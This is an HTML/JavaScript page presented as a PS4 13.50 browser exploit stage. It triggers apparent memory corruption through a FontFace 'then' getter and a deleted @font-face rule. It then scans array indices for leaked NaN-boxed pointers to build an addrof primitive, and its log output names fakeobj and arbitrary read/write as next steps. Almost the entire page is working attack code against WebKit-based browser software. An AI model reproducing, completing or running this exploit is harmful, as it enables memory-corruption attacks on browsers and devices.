<!DOCTYPE html>
<html>
<head>
<title>PS4 13.50 - Index Scanner</title>
</head>
<body>
<h1 id="status">Finding Magic Index</h1>
<button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; max-height: 88vh; overflow-y: scroll; background: #000; color: #0f0;"></div>

<script>
"use strict";

let logBuf = [];
function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.textContent = logBuf.join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return new Float64Array(buf)[0];
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
}

let workingIndices = [];

function runExploit() {
    log('╔════════════════════════════════════════════════╗');
    log('║   PS4 13.50 - MAGIC INDEX SCANNER              ║');
    log('╚════════════════════════════════════════════════╝\n');
    
    log('[*] Goal: Find which array indices leak addresses');
    log('[*] Testing indices: 0, 5, 10, 15, 20... up to 100');
    log('[*] Looking for 0x7ff8... pattern (NaN-boxed pointers)\n');
    
    // Setup
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    // Create arrays with MORE space
    let floatArray = new Float64Array(150);
    let objectArray = new Array(150);
    
    // Fill with KNOWN pattern
    for (let i = 0; i < 150; i++) {
        floatArray[i] = 1.1 * (i + 1); // Pattern: 1.1, 2.2, 3.3, ...
        objectArray[i] = { id: i, marker: 0xBEEF0000 + i };
    }
    
    log('[*] Created Float64Array[150] and Array[150]');
    log('[*] Pattern value at [50]: ' + floatArray[50].toFixed(2));
    log('[*] (Should be 56.10 if no leak)\n');
    
    // Target object for all tests
    let targetObject = {
        magic: 0xDEADBEEF,
        test: "TARGET",
        value: 31337
    };
    
    log('[*] Target object: ' + JSON.stringify(targetObject) + '\n');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('[+] ═══ INSIDE GETTER ═══\n');
                
                // Create corrupted fonts
                log('[*] Creating corrupted fonts...');
                let corrupted = [];
                for (let i = 0; i < 50; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                log('[*] Created ' + corrupted.length + ' corrupted fonts\n');
                
                // Trigger corruption
                log('[*] Triggering corruption...');
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                log('[*] Corruption triggered!\n');
                
                // ============================================
                // INDEX SCAN
                // ============================================
                
                log('╔════════════════════════════════════════╗');
                log('║         SCANNING INDICES               ║');
                log('╚════════════════════════════════════════╝\n');
                
                // Test every 5th index from 0 to 100
                for (let testIdx = 0; testIdx <= 100; testIdx += 5) {
                    try {
                        // Expected pattern value at this index
                        let expectedPattern = 1.1 * (testIdx + 1);
                        
                        // Store target object at this index
                        objectArray[testIdx] = targetObject;
                        
                        // Read from float array at SAME index
                        let leaked = floatArray[testIdx];
                        
                        // Convert to Int64
                        let addr = Int64.fromDouble(leaked);
                        
                        // Check if it changed from pattern
                        let changed = Math.abs(leaked - expectedPattern) > 0.01;
                        
                        // Check if high word looks like NaN-box (0x7ff8 or 0xfff8)
                        let isNaNBoxed = (addr.high & 0xfff80000) === 0x7ff80000 || 
                                        (addr.high & 0xfff80000) === 0xfff80000;
                        
                        // Check if it's a likely address (high word > 0x1000000)
                        let likelyAddr = addr.high >= 0x01000000;
                        
                        // Determine result
                        let result = '';
                        if (isNaNBoxed) {
                            result = '[+++] NaN-BOXED POINTER!';
                            workingIndices.push(testIdx);
                        } else if (changed && likelyAddr) {
                            result = '[++] CHANGED & HIGH WORD!';
                            workingIndices.push(testIdx);
                        } else if (changed) {
                            result = '[+] Changed from pattern';
                        } else {
                            result = '[-] Still pattern (' + expectedPattern.toFixed(1) + ')';
                        }
                        
                        log('[' + String(testIdx).padStart(3, ' ') + '] ' + addr.toString() + '  ' + result);
                        
                    } catch(e) {
                        log('[' + String(testIdx).padStart(3, ' ') + '] ERROR: ' + e.message);
                    }
                }
                
                log('\n');
                
                // ============================================
                // DEEP SCAN ON WORKING INDICES
                // ============================================
                
                if (workingIndices.length > 0) {
                    log('╔════════════════════════════════════════╗');
                    log('║       DEEP SCAN - WORKING INDICES      ║');
                    log('╚════════════════════════════════════════╝\n');
                    
                    log('[*] Found ' + workingIndices.length + ' working indices: ' + workingIndices.join(', ') + '\n');
                    
                    // Test each working index with multiple objects
                    for (let i = 0; i < workingIndices.length; i++) {
                        let idx = workingIndices[i];
                        
                        log('[DEEP TEST Index ' + idx + ']');
                        
                        let testObjs = [
                            { test: 1 },
                            { test: 2 },
                            new ArrayBuffer(0x100)
                        ];
                        
                        for (let j = 0; j < testObjs.length; j++) {
                            objectArray[idx] = testObjs[j];
                            let leaked = floatArray[idx];
                            let addr = Int64.fromDouble(leaked);
                            
                            log('  Obj ' + j + ': ' + addr.toString());
                        }
                        
                        log('');
                    }
                    
                } else {
                    log('╔════════════════════════════════════════╗');
                    log('║         NO WORKING INDICES FOUND       ║');
                    log('╚════════════════════════════════════════╝\n');
                    
                    log('[!] No indices leaked NaN-boxed pointers');
                    log('[*] Checking if ANY indices changed from pattern:\n');
                    
                    // Show indices that at least changed
                    for (let testIdx = 0; testIdx <= 100; testIdx += 5) {
                        let expectedPattern = 1.1 * (testIdx + 1);
                        let leaked = floatArray[testIdx];
                        
                        if (Math.abs(leaked - expectedPattern) > 0.01) {
                            let addr = Int64.fromDouble(leaked);
                            log('  [' + testIdx + '] Changed: ' + addr.toString());
                        }
                    }
                }
                
                // ============================================
                // RECOMMENDATIONS
                // ============================================
                
                log('\n╔════════════════════════════════════════╗');
                log('║           RECOMMENDATIONS              ║');
                log('╚════════════════════════════════════════╝\n');
                
                if (workingIndices.length > 0) {
                    log('[SUCCESS] Working indices found!');
                    log('[NEXT] Use index ' + workingIndices[0] + ' for reliable addrof');
                    log('[NEXT] Build fakeobj with same technique');
                    log('[NEXT] Create fake TypedArray for arb R/W');
                } else {
                    log('[ANALYSIS]');
                    log('  Possible reasons:');
                    log('  1. Arrays aren\'t overlapping in this run');
                    log('  2. Corruption timing is critical');
                    log('  3. Need different array setup');
                    log('');
                    log('[TRY]');
                    log('  - Refresh page and run again');
                    log('  - Arrays might align differently');
                    log('  - First run often works best');
                }
                
                log('\n[!] Returning - OOM will occur\n');
                
                window.workingIndices = workingIndices;
            }
            
            return undefined;
        }
    });
    
    log('[*] Starting exploit...\n');
    document.fonts.load('1em x', 'AB');
    
    setTimeout(() => {
        log('\n[POST-OOM]');
        if (window.workingIndices && window.workingIndices.length > 0) {
            log('[SUCCESS] Working indices: ' + window.workingIndices.join(', '));
        } else {
            log('[INFO] Try refreshing and running again');
        }
    }, 100);
}

log('╔════════════════════════════════════════════════╗');
log('║   PS4 13.50 - FIND MAGIC INDEX                 ║');
log('╚════════════════════════════════════════════════╝\n');
log('[*] This will test indices 0, 5, 10, 15... 100');
log('[*] Looking for which leak addresses');
log('[*] Then deep-test working indices\n');
log('Click RUN\n');

</script>
</body>
</html>
